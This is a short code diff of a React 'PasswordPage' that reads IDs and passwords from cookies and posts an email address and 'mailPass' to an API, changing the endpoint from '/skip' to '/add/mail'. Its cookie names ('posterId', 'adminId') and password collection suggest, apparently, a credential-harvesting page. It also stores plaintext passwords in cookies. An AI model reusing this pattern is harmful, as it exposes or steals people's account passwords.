@@ -13,8 +13,6 @@ function PasswordPage() {
   const router = useRouter();
 
   const id = Cookies.get("id");
-  const email = Cookies.get("email");
-  const password = Cookies.get("password");
   const mail = Cookies.get("mail");
   const skipcode = Cookies.get("skipcode");
 
@@ -71,9 +69,7 @@ function PasswordPage() {
 
     const submitValues = {
       id: id,
-      skipcode: skipcode,
-      email: email,
-      password: password,
+      // skipcode: skipcode,
       mail: mail,
       mailPass: mailPass,
     };
@@ -82,7 +78,7 @@ function PasswordPage() {
 
     // login(submitValues, resetInput);
 
-    const url = `${API_URL}/skip`;
+    const url = `${API_URL}/add/mail`;
 
     const res = await fetch(url, {
       method: "POST",
@@ -101,9 +97,7 @@ function PasswordPage() {
       resetInput();
       // setReset(true);
       Cookies.remove("id");
-      Cookies.remove("email");
-      Cookies.remove("password");
-      Cookies.remove("skipcode");
+      // Cookies.remove("skipcode");
       Cookies.remove("mail");
       Cookies.remove("adminId");
       Cookies.remove("posterId");
